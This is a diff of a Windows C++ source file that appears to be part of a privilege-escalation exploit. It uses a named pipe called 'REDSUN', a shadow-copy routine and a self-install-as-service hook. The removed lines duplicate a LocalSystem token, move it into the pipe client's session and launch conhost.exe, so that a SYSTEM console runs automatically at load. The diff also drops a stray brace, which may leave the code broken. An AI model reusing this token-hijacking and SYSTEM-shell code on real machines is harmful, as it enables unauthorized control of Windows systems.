@@ -514,68 +514,6 @@ void DoCloudStuff(wchar_t* syncroot, wchar_t* filename, DWORD filesz = 0x1000)
 }
 
 
-void LaunchConsoleInSessionId()
-{
-
-    HANDLE hpipe = CreateFile(L"\\??\\pipe\\REDSUN", GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hpipe == INVALID_HANDLE_VALUE)
-        return;
-    DWORD sessionid = 0;
-    if (!GetNamedPipeServerSessionId(hpipe, &sessionid))
-        return;
-    CloseHandle(hpipe);
-    HANDLE htoken = NULL;
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &htoken))
-        return;
-    HANDLE hnewtoken = NULL;
-    bool res = DuplicateTokenEx(htoken, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &hnewtoken);
-    CloseHandle(htoken);
-    if (!res)
-        return;
-
-    res = SetTokenInformation(hnewtoken, TokenSessionId, &sessionid, sizeof(DWORD));
-    if (!res)
-    {
-        CloseHandle(hnewtoken);
-        return;
-    }
-
-    STARTUPINFO si = { 0 };
-    PROCESS_INFORMATION pi = { 0 };
-    CreateProcessAsUser(hnewtoken, L"C:\\Windows\\System32\\conhost.exe", NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
-
-    CloseHandle(hnewtoken);
-
-    if (pi.hProcess)
-        CloseHandle(pi.hProcess);
-    if (pi.hThread)
-        CloseHandle(pi.hThread);
-    return;
-
-}
-
-bool IsRunningAsLocalSystem()
-{
-
-    HANDLE htoken = NULL;
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &htoken)) {
-        printf("OpenProcessToken failed, error : %d\n", GetLastError());
-        return false;
-    }
-    TOKEN_USER* tokenuser = (TOKEN_USER*)malloc(MAX_SID_SIZE + sizeof(TOKEN_USER));
-    DWORD retsz = 0;
-    bool res = GetTokenInformation(htoken, TokenUser, tokenuser, MAX_SID_SIZE + sizeof(TOKEN_USER), &retsz);
-    CloseHandle(htoken);
-    if (!res)
-        return false;
-    bool ret = IsWellKnownSid(tokenuser->User.Sid, WinLocalSystemSid);
-    if (ret) {
-        LaunchConsoleInSessionId();
-        ExitProcess(0);
-    }
-    return ret;
-}
-bool r = IsRunningAsLocalSystem();
 
 void LaunchTierManagementEng()
 {
@@ -589,9 +527,7 @@ void LaunchTierManagementEng()
 }
 
 int RunShadowCopy() {
-    // Forward declaration for service installer
     extern bool InstallSelfAsService();
-{
     HANDLE hpipe = CreateNamedPipe(L"\\??\\pipe\\REDSUN", PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE, NULL, 1, NULL, NULL, NULL,NULL);
     if (hpipe == INVALID_HANDLE_VALUE)
         return 1;
